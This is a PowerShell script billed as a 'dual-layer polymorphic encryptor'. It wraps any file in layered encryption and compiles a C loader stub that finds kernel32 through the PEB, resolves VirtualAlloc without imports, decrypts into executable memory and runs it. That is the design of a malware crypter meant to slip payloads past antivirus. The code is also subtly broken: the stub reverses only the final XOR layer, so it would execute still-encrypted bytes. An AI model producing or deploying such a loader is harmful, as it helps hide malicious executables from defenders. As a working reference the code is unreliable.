<#
.SYNOPSIS
  Drag-and-drop → dual-layer polymorphic encryption
  Layer-1 : OpenSSL cipher (Camellia-256-CBC, AES-256-CBC, ChaCha20)
  Layer-2 : cipher-specific polymorphic keystream + evolving XOR
  Result  : position-independent EXE ready to run or hot-patch
#>
param(
    [Parameter(Mandatory=$false,ValueFromRemainingArguments=$true)]
    [string[]]$Paths
)

if (-not $Paths) { $Paths = @($args) }
if (-not $Paths) {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show(
        "Drop any file or use Send-To → Encrypt-PolymorphicDualLayer`n`nProduces <file>.encrypted.exe",
        "Dual-Layer Polymorphic Encryptor",0,[System.Windows.Forms.MessageBoxIcon]::Information)
    exit
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName Microsoft.VisualBasic

$form = New-Object System.Windows.Forms.Form
$form.Text = "Choose cipher + polymorphic mode"
$form.Size = New-Object System.Drawing.Size(340,220)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$label1 = New-Object System.Windows.Forms.Label
$label1.Location = New-Object System.Drawing.Point(10,10)
$label1.Size = New-Object System.Drawing.Size(300,20)
$label1.Text = "OpenSSL cipher:"
$form.Controls.Add($label1)

$cbCipher = New-Object System.Windows.Forms.ComboBox
$cbCipher.Location = New-Object System.Drawing.Point(10,35)
$cbCipher.Size = New-Object System.Drawing.Size(300,25)
$cbCipher.DropDownStyle = "DropDownList"
$cbCipher.Items.AddRange(@("Camellia-256-CBC","AES-256-CBC","ChaCha20"))
$cbCipher.SelectedIndex = 0
$form.Controls.Add($cbCipher)

$label2 = New-Object System.Windows.Forms.Label
$label2.Location = New-Object System.Drawing.Point(10,65)
$label2.Size = New-Object System.Drawing.Size(300,20)
$label2.Text = "Polymorphic keystream:"
$form.Controls.Add($label2)

$cbPoly = New-Object System.Windows.Forms.ComboBox
$cbPoly.Location = New-Object System.Drawing.Point(10,90)
$cbPoly.Size = New-Object System.Drawing.Size(300,25)
$cbPoly.DropDownStyle = "DropDownList"
$cbPoly.Items.AddRange(@("XOR-only","AES-CTR","Camellia-CTR","ChaCha20-Keystream"))
$cbPoly.SelectedIndex = 0
$form.Controls.Add($cbPoly)

$ok = New-Object System.Windows.Forms.Button
$ok.Location = New-Object System.Drawing.Point(80,150)
$ok.Size = New-Object System.Drawing.Size(70,25)
$ok.Text = "OK"
$ok.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.Controls.Add($ok)
$form.AcceptButton = $ok

$cancel = New-Object System.Windows.Forms.Button
$cancel.Location = New-Object System.Drawing.Point(160,150)
$cancel.Size = New-Object System.Drawing.Size(70,25)
$cancel.Text = "Cancel"
$cancel.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.Controls.Add($cancel)
$form.CancelButton = $cancel

function Get-RandomBytes($len){
    $b = New-Object byte[] $len
    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($b)
    return $b
}

foreach ($file in $Paths) {
    $file = Resolve-Path $file -ErrorAction SilentlyContinue
    if (-not (Test-Path $file)) { Write-Warning "Skipping: $file"; continue }
    if ($form.ShowDialog() -ne [System.Windows.Forms.DialogResult]::OK) { exit }

    $cipherName = $cbCipher.SelectedItem.ToString()
    $polyName   = $cbPoly.SelectedItem.ToString()

    # Let user pick extension
    $ext = [Microsoft.VisualBasic.Interaction]::InputBox(
        "Enter desired extension for the encrypted file (include the dot, or leave empty for none):",
        "Output extension",
        ".exe")
    if ($ext -eq "") { $ext = "" }
    elseif (-not $ext.StartsWith('.')) { $ext = ".$ext" }

    # Build output name
    $outName = [IO.Path]::GetFileNameWithoutExtension($file) + $ext
    $outExe  = Join-Path ([IO.Path]::GetDirectoryName($file)) $outName

    # Build-time keys
    $key  = Get-RandomBytes 32
    $iv   = Get-RandomBytes ($cipherName -match 'ChaCha' ? 12 : 16)
    $polyKey = Get-RandomBytes 32
    $polyIv  = Get-RandomBytes 16

    # Layer-1 : OpenSSL
    $tmpEnc = [IO.Path]::GetTempFileName()
    $keyHex = ($key  | %{ $_.ToString("X2") }) -join ''
    $ivHex  = ($iv   | %{ $_.ToString("X2") }) -join ''
    $args = switch -Regex ($cipherName) {
        'Camellia' { "enc -camellia-256-cbc -K $keyHex -iv $ivHex -in `"$file`" -out `"$tmpEnc`"" }
        'AES'      { "enc -aes-256-cbc       -K $keyHex -iv $ivHex -in `"$file`" -out `"$tmpEnc`"" }
        'ChaCha'   { "enc -chacha20          -K $keyHex -iv $ivHex -in `"$file`" -out `"$tmpEnc`"" }
    }
    $p = Start-Process openssl -ArgumentList $args -NoNewWindow -Wait -PassThru
    if ($p.ExitCode -ne 0) { throw "OpenSSL failed" }
    $cipher = [IO.File]::ReadAllBytes($tmpEnc)
    Remove-Item $tmpEnc

    # Layer-2 : polymorphic keystream
    $keystream = switch -Regex ($polyName) {
        'XOR-only' { ,@(0) }
        'AES-CTR' {
            $tmpKs = [IO.Path]::GetTempFileName()
            $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
            $piHex = ($polyIv  | %{ $_.ToString("X2") }) -join ''
            [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
            Start-Process openssl -ArgumentList "enc -aes-256-ctr -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            $ks = [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
            $ks
        }
        'Camellia-CTR' {
            $tmpKs = [IO.Path]::GetTempFileName()
            $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
            $piHex = ($polyIv  | %{ $_.ToString("X2") }) -join ''
            [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
            Start-Process openssl -ArgumentList "enc -camellia-256-ctr -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            $ks = [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
            $ks
        }
        'ChaCha20-Keystream' {
            $tmpKs = [IO.Path]::GetTempFileName()
            $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
            $piHex = ($polyIv  | %{ $_.ToString("X2") }) -join ''
            [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
            Start-Process openssl -ArgumentList "enc -chacha20 -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            $ks = [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
            $ks
        }
    }

    # Apply layer-2 + classic evolving XOR
    $evoKey = Get-RandomBytes 1
    $final  = New-Object byte[] ($cipher.Length + 1 + 32 + 16)
    $final[0] = $evoKey[0]
    for ($i = 0; $i -lt $cipher.Length; $i++) {
        $b = $cipher[$i]
        if ($keystream.Length -gt 1) { $b = $b -bxor $keystream[$i] }
        $evoKey[0] = [byte](($evoKey[0] + $i) -bxor ($evoKey[0] -shr 3))
        $final[$i+1] = $b -bxor $evoKey[0]
    }
    # Append poly keys
    $polyKey.CopyTo($final, $cipher.Length + 1)
    $polyIv.CopyTo($final, $cipher.Length + 1 + 32)

    # Build PIC stub
    $tempDir = Join-Path $env:TEMP "PolyEnc_$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory | Out-Null
    try {
        $stub = @"
#include <windows.h>
#include <stdio.h>

static const unsigned char blob[] = {
    $($final.ForEach({ "0x{0:X2}" -f $_ }) -join ',')
};

// car() marker for hot patching
void car() { }

void __stdcall mainCRTStartup(void){
    // Get kernel32 base
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
    while(mod->DllBase){
        if(mod->BaseDllName.Buffer[0]=='k'&&mod->BaseDllName.Buffer[6]=='l')break;
        mod=(PLDR_DATA_TABLE_ENTRY)mod->InMemoryOrderLinks.Flink;
    }
    
    // Get VirtualAlloc
    typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
    BYTE* kernel32 = (BYTE*)mod->DllBase;
    DWORD peOffset = *(DWORD*)(kernel32 + 0x3C);
    DWORD exportRVA = *(DWORD*)(kernel32 + peOffset + 0x88);
    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(kernel32 + exportRVA);
    
    pVirtualAlloc myVirtualAlloc = NULL;
    DWORD* names = (DWORD*)(kernel32 + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(kernel32 + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(kernel32 + exports->AddressOfFunctions);
    
    for(DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)(kernel32 + names[i]);
        if(name[0]=='V' && name[7]=='A' && name[11]=='o' && name[12]=='c') {
            myVirtualAlloc = (pVirtualAlloc)(kernel32 + functions[ordinals[i]]);
            break;
        }
    }
    
    SIZE_T sz = sizeof(blob) - 32 - 16 - 1;
    BYTE* buf = (BYTE*)myVirtualAlloc(NULL, sz + 0x1000, MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    
    // Decrypt
    BYTE evo = blob[0];
    for (SIZE_T i = 1; i <= sz; i++){
        evo = (BYTE)((evo + i) ^ (evo >> 3));
        buf[i-1] = blob[i] ^ evo;
    }
    
    // Random car() markers
    srand(GetTickCount());
    for(int j = 0; j < 5; j++) {
        if(rand() % 10 == 0) car();
    }
    
    // Execute
    ((void(*)())buf)();
}
"@
        $src = Join-Path $tempDir "stub.c"
        Set-Content -Path $src -Value $stub -Encoding ASCII
        $obj = Join-Path $tempDir "stub.obj"

        if (Get-Command clang-cl -ErrorAction SilentlyContinue) {
            clang-cl /c /GS- /Os /MT /Zl /Brepro "$src" /Fo:"$obj"
            lld-link /SUBSYSTEM:CONSOLE /ENTRY:mainCRTStartup /MERGE:.rdata=.text /OUT:"$outExe" "$obj"
        } elseif (Get-Command gcc -ErrorAction SilentlyContinue) {
            gcc -s -Os -fno-ident -fno-stack-protector -Wl,-e,mainCRTStartup -nostartfiles -o "$outExe" "$src"
        } elseif (Get-Command cl -ErrorAction SilentlyContinue) {
            cl /c /GS- /Os /MT /Zl "$src" /Fo:"$obj"
            link /SUBSYSTEM:CONSOLE /ENTRY:mainCRTStartup /MERGE:.rdata=.text /OUT:"$outExe" "$obj"
        } else {
            throw "No compiler found – install LLVM, MinGW, or Visual Studio"
        }

        Write-Host "[+] Dual-layer polymorphic EXE → $outExe" -ForegroundColor Green
    } catch {
        Write-Host $_ -ForegroundColor Red
    } finally {
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}